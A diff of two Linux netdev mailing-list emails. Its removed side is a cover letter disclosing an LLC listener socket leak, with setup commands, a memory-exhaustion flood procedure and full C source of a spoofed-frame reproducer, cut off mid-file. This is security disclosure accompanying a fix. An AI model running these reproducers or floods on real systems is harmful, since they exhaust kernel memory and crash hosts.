@@ -1,62 +1,64 @@
 Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A07B2F4F1
-	for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 16:53:19 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6DE7F345749
+	for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 16:53:32 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789232002; cv=none; b=R42O7fwLKu68S4qsdHhLre5ABVzfzj+7Z/4oMWx2Nm79lTaG7HjyCN1zP+XT4wVkEEsGTfQThBKqBK1QH4HMHU71CziJl54fkWn8aYrnx3Q1T7k3xSYpBh7/P9SXQBHojXETuEyoxfNh1P+gKFf31Q2Ho/7RYm/RLWJVwEsiZhY=
+	t=1789232015; cv=none; b=D93cE+jGUUsZI8zfe4IxnYYQ2lToEjvl7ACzptprBjt9Ozq7Astt641Kub9QllbGDV8pX42T+CBylaH5ObS9fBDFjUuZ2JdQyRyoniWUZRT3WpwRsx69D79NYdpNYOJta5dGI6ACT2HTMsvxCFjPSr8nN7LHtRsNYtM8YoHXPao=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789232002; c=relaxed/simple;
-	bh=G3Hia2qsxmT2phhi7i+AtGQ8HLQOGNBW5H8F/ZMR0RA=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=XrBYkm0/ISxqiGHyfDtG0UW0hRyKcQWHtx69MOd3baXhiX2XXWiOwHz65p9XHrGr98O2JbPWD5v/LlCc5ekXsYnxK459/GlKZGfr0xSWjCnrDnCMYMv7QZvnkL+LUcZsNBIysQzwcB8FFBQzflZK4o8CL8pQS+ZFQ4qSksRdiuA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=NKTG76jt; arc=none smtp.client-ip=74.125.227.140
+	s=arc-20240116; t=1789232015; c=relaxed/simple;
+	bh=CyZ+wRTv1vIAKrqoIFsovZCTxpZs1MpCacIyScmvP4g=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=e+kil2o2gCQippC8AbupUEV4/lEUuPq6ElcVFWw7VoFkF5goBFOO6SL+O3ESyAo8w3gKAfWqjnUmrz/NnjEwmaLRj4YJ7Q5udKok67N9CD50nhQPGzbEFnExppv49r6qbD/qeWg/VHKwx7C+nd2PR9Q14aJhCgjshPeszGnhurY=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=kAHfo1hJ; arc=none smtp.client-ip=74.125.227.140
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="NKTG76jt"
-Received: by mail-pj2-f12.google.com with SMTP id 98e67ed59e1d1-396ccafb74fso831081a91.3
-        for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 09:53:19 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="kAHfo1hJ"
+Received: by mail-pj2-f12.google.com with SMTP id 98e67ed59e1d1-396ccd66bb5so519376a91.0
+        for <netdev@vger.kernel.org>; Sat, 12 Sep 2026 09:53:32 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1789231999; x=1789836799; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=/Q33cGw5fJmB8NINMPvbfO0PglpOSyHmwq1hPR0ChNE=;
-        b=NKTG76jt9ftLIcxKAqGiREgIcmrt5vah5N93kTZV6GwJQ8IlHmvW/pXlu4sQ4v/CVo
-         NqGOjUT0/Xa+2Rv4rkwWyMv3EirMaK2wnD08hbiW6tXHlAwsJoPhox3ojti23KKxnOo6
-         ozgo6nSUnSO99cM2BJSIFaiMdyOk86ekIp28R0a8OxPv7HhOWZ6+q4ntTyi7bV/KFZ5h
-         D+s8STBsk8v6G62k4XZwr3zq99LlAuXxpj7abFlLljIO13Bx85coap5/ZVMxWp1BKPfc
-         XDAEZIuKj49EAhbr1gPEN+eJUTBJzGIl2MHRCbSm8Rz1zcTyfVj5WqSekpC0E282JyiN
-         1N6A==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1789231999; x=1789836799;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=nebusec.ai; s=google; t=1789232012; x=1789836812; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=/Q33cGw5fJmB8NINMPvbfO0PglpOSyHmwq1hPR0ChNE=;
-        b=B3IChWaetZmhLqD5qu1Quna3YPejR/9y7qEJuYtGv/1mD9gLCPknStR42iIn9WcSAj
-         Onkf13P34WRAU88hCQy7rY2WpjuvLuwIhzNzZYQRvyxiPJozDatyJZfMr9z3XKHlcX0T
-         LRnl5BOXfoNpjxuqFB0h0sbzMpqM3eoacuxxh+U8Q49JjFUAFMR97XL+GJyj98amcpEW
-         IXwCST6LxLJiPXCLPKSJE5PSkq9byB52OTk+QWoR84sDVLlH1COyz02wuCN/uNveyddW
-         YfGdvjnmW+i1aMbZxEJlC8RSxKFRvpyu96maodejnRgkbiQkQw4FV15/vLK3e3+zywA4
-         DQWg==
-X-Gm-Message-State: AFuF++mBPb8WyfhIdjf639gs9tnFDhEysQLHbrRva/uAO3Gah0G5GA0n
-	h+xMQgv9yvYDMywEA9PeClOLLg6RTGmcC2hdpswk3QgAwAxJmHz8zrzX3SBs3W3ubE9/XYW829u
-	4e8ao/dsi
-X-Gm-Gg: AYBFou0g0w+BjdG4zkTFcZsg7T3sq2T/afwp15pn8xFBAPHIv5qt9T2pNUDXPeKBr/D
-	DWuq36Ud4ZmB8tuf/CsiPesekBgIp0+FqnAlyjCTYtTyA07EPPi1BOe3DFjm27aJoGVkw5McohT
-	fSAnrYgm9hI2XqJOPXFbzYD1FB4vWoDUcYMtIVXheytc+JETetiJIqqW74F9VwS6dORvFxS2ILT
-	wpuenExPeQwYvD8+4BtVBpqyQHqpj6oyNK/TuwvEkXbmUuCCqoo+qJZ9EOik+Gr3ydQ62dWbN+e
-	msaDQDOI0x3NJR1tWwqaytCuJMBrpcX+6Ir0XQPs8J+/tW86fM+WCeVSBr4cHq2ClgT15PiuwHe
-	UfTzklLOXkQ5i9uioaVeRBLLLPzhEgr3nX6BKzfsDpk/sxSXVncl9CFW+S6S5HA5yB9C4xi1CG9
-	6185g745Z45ZvCEEdx01a1RKHStKPO/iwY5xKpmCIiUvxgvYXgEgxfNhMEw1iXuQxZpqFnK5xxH
-	qVh6ISOWqsxiY9jMCaKYPyvOoi0qlDneiiOLC64
-X-Received: by 2002:a17:90b:57ce:b0:396:b918:c2a with SMTP id 98e67ed59e1d1-39d9c1dbb3emr18273850a91.12.1789231998369;
-        Sat, 12 Sep 2026 09:53:18 -0700 (PDT)
+        bh=KmnVyR1UBi6OqqthmqlN2O4hpIy7YDRf9qXHJ0j6VeU=;
+        b=kAHfo1hJ3pfwyyLLftdPS6ssWElRaew7Q+FQsfaVKTUZioE6Bs2g7eoKqvSPAXI5dm
+         D6Aiih2ViIWdAf3VEiQKSa5pwBPLTGnYgWHfd+btiWCPXA6RBi4sygp3eeYMHu4Innc5
+         ByyH+zOXd9rySEraT+bc+N0rYAwyJILcWxbcEo99Pg1rHNvo9SjqcfiT6bC7KsSHQhWQ
+         CeDAkrUyHsQT7oFspaiDd0LcMkuOJpY1930xvL/pidroYYKW3U8QT0GD7DSmWBHku7cF
+         g8rEWaIFElz7WYL08o2wHcw7irPPyJDE6Lyumfk3riWqYBYq2Nq2Tgr+YHb3D2oUc+tJ
+         RMRA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1789232012; x=1789836812;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=KmnVyR1UBi6OqqthmqlN2O4hpIy7YDRf9qXHJ0j6VeU=;
+        b=WZR5ZI7oOizFrXo1lfNPSVqzEy1O+PZkGrn5gkUK1fK3cM7EmddROJe4gA7KeoFlny
+         rVYTE7rjiGgtSv1fPhDJXudKCPCUxWM7865OJZaro4+QLtA6twQ6NvQ9PZvNwqUxnHyM
+         ccEQkN0+85ku7OzpR7P4ErEwcgrByYjuaD8Yw1iXuchHQw0CU9jvBOvINR+qG74fH5bU
+         8BMMz0jpf7jfgooLSOsbBacciYHTvqdyzPSzKzvlU+S2DucYZFnql5ykl5Er/y9AUs7p
+         9AuFKUwPCvnH4LFC5zjm2uW0xMY+JU1XwsWnE274WBSyWorTSX9gknE2byIIti+/5OXr
+         lvXA==
+X-Gm-Message-State: AFuF++nVANPLSRiLEomD5KLKKAWvV0nL2Ombl5TbQhnwuOsNxRe7Erq0
+	IarI2JKaWb9JGXrFC2HPVWaKW5uuy256isjGZBXuw2MJjGq7sYVFMEa2rh10rMC4vSMPX1rHVIA
+	AuOIDUw==
+X-Gm-Gg: AYBFou19bzTjRuaxnlmtbLjDsiBRmxLtEPe5pMcT02apB4AHBJWwjnTUKIJBsuyC6v7
+	CJFi2TVLeBu8YZ5BFIXgU9oKRv4vNc04/L8Mfa6loVJWLtCjUBjnrWDuBoh87IICvipwNebG3a2
+	0VzCrR/LQ+hfSrK8pv3k+fr/j2kLHcuQSmTznOH33FUawFUiTAT5BTA+3au/PYivsCzOWfRPhLi
+	3k6YPomfqKcj2Wetx6++71irOnoJ00HUbk1pMPUARjgTN+ZvnU2BBdUx5M/GVj11AkWCnv/rnZs
+	TUm4Fgfa4pKYok6DfYoYd24VlD4q0VyNr71/ntWm6UWahntNWeOyMgRb4srgMtrMIU5/gH78H3s
+	6k/mv9Bzl2lEZ/lbZl9/25GKiQh7+tiWirxYd2y3YNtR1ypFnkMu4G2Qwz2BBwNgQb6CIWgjqiO
+	MgecICU4kL2fen273FIfpXyoOEdKyc+Lz4wX9adeoDk+1+00ArmcsUEmAb00OyEw5JWtViFTeA5
+	eEIeBndTzQEGMUNLb1ux/6Uug0dYA==
+X-Received: by 2002:a17:90b:57c6:b0:381:a766:efc9 with SMTP id 98e67ed59e1d1-39dbbeb57a5mr6717852a91.7.1789232011503;
+        Sat, 12 Sep 2026 09:53:31 -0700 (PDT)
 Received: from b6ad5085b32f.. ([122.51.212.64])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39d99531b21sm10907424a91.13.2026.09.12.09.53.14
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39d99531b21sm10907424a91.13.2026.09.12.09.53.27
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sat, 12 Sep 2026 09:53:17 -0700 (PDT)
+        Sat, 12 Sep 2026 09:53:30 -0700 (PDT)
 From: Zihan Xi <zihanx@nebusec.ai>
 To: netdev@vger.kernel.org
 Cc: Zihan Xi <zihanx@nebusec.ai>,
@@ -66,11 +68,15 @@ Cc: Zihan Xi <zihanx@nebusec.ai>,
 	kuba@kernel.org,
 	pabeni@redhat.com,
 	horms@kernel.org,
-	stable@vger.kernel.org
-Subject: [PATCH net v9 0/1] llc: fix listener child socket leak on non-SABME frames
-Date: Sat, 12 Sep 2026 16:53:04 +0000
-Message-ID: <cover.1789216793.git.zihanx@nebusec.ai>
+	stable@vger.kernel.org,
+	Vega <vega@nebusec.ai>,
+	Luxing Yin <root@tr0jan.top>
+Subject: [PATCH net v9 1/1] llc: fix listener child socket leak on non-SABME frames
+Date: Sat, 12 Sep 2026 16:53:05 +0000
+Message-ID: <5d2eb4eae5248b37f14ae713a9c0ad1c6f1fedd3.1789216793.git.zihanx@nebusec.ai>
 X-Mailer: git-send-email 2.47.3
+In-Reply-To: <cover.1789216793.git.zihanx@nebusec.ai>
+References: <cover.1789216793.git.zihanx@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -79,700 +85,36 @@ List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi Linux kernel maintainers,
-
-We found and validated an issue in net/llc/llc_conn.c. The reproducer
-requires CAP_NET_RAW and CAP_NET_ADMIN in init_net.
-We've tested it, and it should not affect any other functionality.
-
-We will provide detailed information about the bug
-in this email, along with a PoC to trigger it.
-
----- details below ----
-
-Bug details:
-
-llc_conn_handler() creates a child socket for every frame matched by a
-listening PF_LLC socket. llc_create_incoming_sock() publishes that child
-in the SAP tables and takes a device reference before the frame is known
-to be a passive-open request.
-
-For listener-directed non-SABME traffic, no LLC_CONN_PRIM indication is
-queued, so accept() cannot return the child and closing the listener does
-not reclaim it. The leak reproducer uses the DISC path: a PF_LLC
-SOCK_STREAM listener with injected DISC commands, each from a unique source
-MAC. On the unpatched kernel, `wc -l /proc/net/llc/socket`
-changed from 0 to 100 after the listener process exited. The raw proc table
-from that run was not saved. Repeating that traffic until the 2 GB guest is
-exhausted produces the panic_on_oom log below. It is later evidence of
-memory exhaustion from out_of_memory() and a page fault in the PoC process;
-it does not contain llc_conn_handler(). The panic was captured on
-6.12.74 and decoded using a rebuilt 6.12.74 vmlinux (DEBUG_INFO=y,
-KASAN=y). Some lockdep and
-sanitizer helper frames and do_pte_missing retain raw offsets because the
-rebuilt vmlinux does not match the original 6.12.74 #3 binary.
-
-A SABME command is the valid passive-open request and is not the trigger
-used by the leak reproducer. poc-sabme.c exercises the existing SABME
-accept and listener-close paths. This patch does not change that lifecycle.
-
-The accept-queue accounting and the llc_ui_accept() NULL dereference
-concern are separate from this non-SABME leak. The v9 diff does not change
-accept-queue accounting or llc_ui_accept(). Unbounded SABME child
-allocation is a separate issue as well. None of these three issues is
-claimed as fixed here.
-
-The fix creates children only for SABME commands. DISC commands and other
-P=1 commands are answered with a DM response addressed to the source
-address decoded from the packet. Other non-SABME traffic is dropped before
-it reaches the connection state machine. SABME child creation remains in
-the existing path, preserving the existing passive-open tuple lookup
-behavior.
-
-The child publication and device-reference handling were introduced in
-1da177e4c3f4 ("Linux-2.6.12-rc2") and retained by
-d389424e00f9 ("[LLC]: Fix the accept path"). Fixes therefore points to
-1da177e4c3f4.
-
-PF_LLC socket creation is restricted to init_net. The PF_LLC listener
-and the AF_PACKET injector require CAP_NET_RAW; CAP_NET_ADMIN is needed
-to create and configure the veth pair. unshare -Urn is not used because
-PF_LLC socket creation returns EAFNOSUPPORT outside init_net. The
-reproducer therefore sets up a veth pair and injects AF_PACKET frames in
-init_net.
-
-The optional panic_on_oom setting only turns the final memory exhaustion
-into stable crash evidence after leftover LLC sockets are already visible
-in /proc/net/llc/socket. It is not required to trigger the leak itself.
-
-packetdrill was not used because the trigger combines a PF_LLC listening
-socket, AF_PACKET injection, a veth pair, and rotating source MAC
-addresses to create distinct passive-open tuples. The C PoC shows that
-combined resource-leak path directly.
-
-Reproducer:
-
-    gcc -O2 -static -o poc poc.c
-    gcc -O2 -static -o poc-sabme poc-sabme.c
-    ip link add llc_rx0 type veth peer name llc_tx0
-    ip link set llc_rx0 address 02:11:22:33:44:55
-    ip link set llc_tx0 address 02:11:22:33:44:66
-    ip link set llc_rx0 up
-    ip link set llc_tx0 up
-    ./poc llc_rx0 llc_tx0 100
-    wc -l /proc/net/llc/socket
-
-The command above is the short DISC leak check. The additional SABME paths
-are:
-
-    ./poc-sabme accept llc_rx0 llc_tx0
-    ./poc-sabme close llc_rx0 llc_tx0 100
-
-For deterministic crash evidence, after leftover LLC sockets are confirmed
-by the short run above, we additionally set panic_on_oom and run
-the longer DISC flood:
-
-    echo 2 > /proc/sys/vm/panic_on_oom
-    ./poc llc_rx0 llc_tx0 110000
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-------BEGIN poc.c------
-#define _GNU_SOURCE
-
-#include <arpa/inet.h>
-#include <errno.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_packet.h>
-#include <linux/if.h>
-#include <linux/llc.h>
-#include <net/ethernet.h>
-#include <stdbool.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-#ifndef AF_LLC
-#define AF_LLC 26
-#endif
-
-#define DEFAULT_RX_IF "llc_rx0"
-#define DEFAULT_TX_IF "llc_tx0"
-#define DEFAULT_SAP 0xc0
-#define DEFAULT_REPORT_EVERY 10000ULL
-
-static void die_errno(const char *what)
-{
-	perror(what);
-	exit(EXIT_FAILURE);
-}
-
-static void usage(const char *prog)
-{
-	fprintf(stderr,
-		"usage: %s [rx_if] [tx_if] [count]\n"
-		"  rx_if: LLC listener interface (default: %s)\n"
-		"  tx_if: raw packet sender interface (default: %s)\n"
-		"  count: number of DISC frames to send, 0 means forever\n",
-		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
-}
-
-static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
-{
-	struct ifreq ifr;
-	int fd;
-
-	fd = socket(AF_INET, SOCK_DGRAM, 0);
-	if (fd < 0)
-		die_errno("socket(AF_INET)");
-
-	memset(&ifr, 0, sizeof(ifr));
-	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
-	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
-		die_errno("ioctl(SIOCGIFHWADDR)");
-
-	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
-	close(fd);
-}
-
-static int get_ifindex(const char *ifname)
-{
-	struct ifreq ifr;
-	int fd;
-
-	fd = socket(AF_INET, SOCK_DGRAM, 0);
-	if (fd < 0)
-		die_errno("socket(AF_INET)");
-
-	memset(&ifr, 0, sizeof(ifr));
-	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
-	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
-		die_errno("ioctl(SIOCGIFINDEX)");
-
-	close(fd);
-	return ifr.ifr_ifindex;
-}
-
-static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
-{
-	struct sockaddr_llc addr;
-	int fd;
-
-	fd = socket(AF_LLC, SOCK_STREAM, 0);
-	if (fd < 0)
-		die_errno("socket(AF_LLC)");
-
-	get_if_hwaddr(ifname, mac);
-
-	memset(&addr, 0, sizeof(addr));
-	addr.sllc_family = AF_LLC;
-	addr.sllc_arphrd = ARPHRD_ETHER;
-	addr.sllc_sap = sap;
-	memcpy(addr.sllc_mac, mac, ETH_ALEN);
-
-	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
-		die_errno("bind(AF_LLC)");
-	if (listen(fd, 16) < 0)
-		die_errno("listen(AF_LLC)");
-
-	return fd;
-}
-
-static int make_packet_socket(const char *ifname, int *ifindex_out)
-{
-	struct sockaddr_ll sll;
-	int fd;
-	int one = 1;
-	int ifindex = get_ifindex(ifname);
-
-	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-	if (fd < 0)
-		die_errno("socket(AF_PACKET)");
-
-	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
-
-	memset(&sll, 0, sizeof(sll));
-	sll.sll_family = AF_PACKET;
-	sll.sll_protocol = htons(ETH_P_ALL);
-	sll.sll_ifindex = ifindex;
-
-	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
-		die_errno("bind(AF_PACKET)");
-
-	*ifindex_out = ifindex;
-	return fd;
-}
-
-static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
-{
-	mac[0] = 0x02;
-	mac[1] = (n >> 32) & 0xff;
-	mac[2] = (n >> 24) & 0xff;
-	mac[3] = (n >> 16) & 0xff;
-	mac[4] = (n >> 8) & 0xff;
-	mac[5] = n & 0xff;
-}
-
-int main(int argc, char **argv)
-{
-	static unsigned char frame[ETH_ZLEN];
-	unsigned char dst_mac[ETH_ALEN];
-	unsigned char src_mac[ETH_ALEN];
-	struct sockaddr_ll sll;
-	const char *rx_if = DEFAULT_RX_IF;
-	const char *tx_if = DEFAULT_TX_IF;
-	uint64_t count = 0;
-	uint64_t i = 1;
-	int listener_fd;
-	int packet_fd;
-	int ifindex;
-
-	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
-		usage(argv[0]);
-		return 0;
-	}
-	if (argc > 1)
-		rx_if = argv[1];
-	if (argc > 2)
-		tx_if = argv[2];
-	if (argc > 3) {
-		char *end = NULL;
-
-		errno = 0;
-		count = strtoull(argv[3], &end, 0);
-		if (errno || !end || *end != '\0') {
-			fprintf(stderr, "invalid count: %s\n", argv[3]);
-			return EXIT_FAILURE;
-		}
-	}
-	if (argc > 4) {
-		usage(argv[0]);
-		return EXIT_FAILURE;
-	}
-
-	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
-	packet_fd = make_packet_socket(tx_if, &ifindex);
-
-	memset(frame, 0, sizeof(frame));
-	memcpy(frame, dst_mac, ETH_ALEN);
-	((struct ethhdr *)frame)->h_proto = htons(3);
-	frame[ETH_HLEN + 0] = DEFAULT_SAP;
-	frame[ETH_HLEN + 1] = 0x04;
-	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */
-
-	memset(&sll, 0, sizeof(sll));
-	sll.sll_family = AF_PACKET;
-	sll.sll_ifindex = ifindex;
-	sll.sll_halen = ETH_ALEN;
-	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);
-
-	fprintf(stderr,
-		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
-		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
-	fprintf(stderr,
-		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
-		dst_mac[0], dst_mac[1], dst_mac[2],
-		dst_mac[3], dst_mac[4], dst_mac[5]);
-	fprintf(stderr,
-		"sending LLC DISC commands with a unique spoofed source MAC each time\n");
-
-	while (!count || i <= count) {
-		fill_src_mac(src_mac, i);
-		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
-			src_mac[ETH_ALEN - 1] ^= 1;
-		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);
-
-		if (sendto(packet_fd, frame, sizeof(frame), 0,
-			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
-			die_errno("sendto(AF_PACKET)");
-
-		if (!(i % DEFAULT_REPORT_EVERY))
-			fprintf(stderr, "sent=%llu\n",
-				(unsigned long long)i);
-		i++;
-	}
-
-	close(packet_fd);
-	close(listener_fd);
-	return 0;
-}
-------END poc.c--------
-
-------BEGIN poc-sabme.c------
-#define _GNU_SOURCE
-
-#include <arpa/inet.h>
-#include <errno.h>
-#include <linux/if.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_packet.h>
-#include <linux/llc.h>
-#include <net/ethernet.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/ioctl.h>
-#include <sys/socket.h>
-#include <sys/time.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-#ifndef AF_LLC
-#define AF_LLC 26
-#endif
-
-#define DEFAULT_RX_IF "llc_rx0"
-#define DEFAULT_TX_IF "llc_tx0"
-#define DEFAULT_SAP 0xc0
-#define SABME_CMD 0x6f
-
-static void die_errno(const char *what)
-{
-	perror(what);
-	exit(EXIT_FAILURE);
-}
-
-static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
-{
-	struct ifreq ifr;
-	int fd = socket(AF_INET, SOCK_DGRAM, 0);
-
-	if (fd < 0)
-		die_errno("socket(AF_INET)");
-	memset(&ifr, 0, sizeof(ifr));
-	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
-	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
-		die_errno("ioctl(SIOCGIFHWADDR)");
-	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
-	close(fd);
-}
-
-static int get_ifindex(const char *ifname)
-{
-	struct ifreq ifr;
-	int fd = socket(AF_INET, SOCK_DGRAM, 0);
-
-	if (fd < 0)
-		die_errno("socket(AF_INET)");
-	memset(&ifr, 0, sizeof(ifr));
-	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
-	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
-		die_errno("ioctl(SIOCGIFINDEX)");
-	close(fd);
-	return ifr.ifr_ifindex;
-}
-
-static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
-{
-	struct sockaddr_llc addr;
-	int fd = socket(AF_LLC, SOCK_STREAM, 0);
-
-	if (fd < 0)
-		die_errno("socket(AF_LLC)");
-	get_if_hwaddr(ifname, mac);
-	memset(&addr, 0, sizeof(addr));
-	addr.sllc_family = AF_LLC;
-	addr.sllc_arphrd = ARPHRD_ETHER;
-	addr.sllc_sap = sap;
-	memcpy(addr.sllc_mac, mac, ETH_ALEN);
-	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
-		die_errno("bind(AF_LLC)");
-	if (listen(fd, 16) < 0)
-		die_errno("listen(AF_LLC)");
-	return fd;
-}
-
-static int make_packet_socket(const char *ifname, int *ifindex_out)
-{
-	struct sockaddr_ll sll;
-	int one = 1;
-	int ifindex = get_ifindex(ifname);
-	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-
-	if (fd < 0)
-		die_errno("socket(AF_PACKET)");
-	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
-	memset(&sll, 0, sizeof(sll));
-	sll.sll_family = AF_PACKET;
-	sll.sll_protocol = htons(ETH_P_ALL);
-	sll.sll_ifindex = ifindex;
-	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
-		die_errno("bind(AF_PACKET)");
-	*ifindex_out = ifindex;
-	return fd;
-}
-
-static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
-{
-	mac[0] = 0x02;
-	mac[1] = (n >> 32) & 0xff;
-	mac[2] = (n >> 24) & 0xff;
-	mac[3] = (n >> 16) & 0xff;
-	mac[4] = (n >> 8) & 0xff;
-	mac[5] = n & 0xff;
-}
-
-static void send_sabme(int packet_fd, int ifindex, const unsigned char dst[ETH_ALEN],
-		       const unsigned char src[ETH_ALEN])
-{
-	static unsigned char frame[ETH_ZLEN];
-	struct sockaddr_ll sll;
-
-	memset(frame, 0, sizeof(frame));
-	memcpy(frame, dst, ETH_ALEN);
-	memcpy(frame + ETH_ALEN, src, ETH_ALEN);
-	((struct ethhdr *)frame)->h_proto = htons(3);
-	frame[ETH_HLEN + 0] = DEFAULT_SAP;
-	frame[ETH_HLEN + 1] = 0x04;
-	frame[ETH_HLEN + 2] = SABME_CMD;
-	memset(&sll, 0, sizeof(sll));
-	sll.sll_family = AF_PACKET;
-	sll.sll_ifindex = ifindex;
-	sll.sll_halen = ETH_ALEN;
-	memcpy(sll.sll_addr, dst, ETH_ALEN);
-	if (sendto(packet_fd, frame, sizeof(frame), 0,
-		   (struct sockaddr *)&sll, sizeof(sll)) < 0)
-		die_errno("sendto(AF_PACKET)");
-}
-
-static void usage(const char *prog)
-{
-	fprintf(stderr, "usage: %s accept|close [rx_if] [tx_if] [count]\n", prog);
-}
-
-int main(int argc, char **argv)
-{
-	unsigned char dst_mac[ETH_ALEN];
-	unsigned char src_mac[ETH_ALEN];
-	const char *mode;
-	const char *rx_if = DEFAULT_RX_IF;
-	const char *tx_if = DEFAULT_TX_IF;
-	uint64_t count = 1;
-	uint64_t i;
-	int listener_fd;
-	int packet_fd;
-	int ifindex;
-
-	if (argc < 2) {
-		usage(argv[0]);
-		return EXIT_FAILURE;
-	}
-	mode = argv[1];
-	if (argc > 2)
-		rx_if = argv[2];
-	if (argc > 3)
-		tx_if = argv[3];
-	if (argc > 4) {
-		char *end = NULL;
-
-		errno = 0;
-		count = strtoull(argv[4], &end, 0);
-		if (errno || !end || *end != '\0' || !count) {
-			fprintf(stderr, "invalid count: %s\n", argv[4]);
-			return EXIT_FAILURE;
-		}
-	}
-
-	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
-	packet_fd = make_packet_socket(tx_if, &ifindex);
-	fprintf(stderr, "mode=%s listener_if=%s sender_if=%s count=%llu\n",
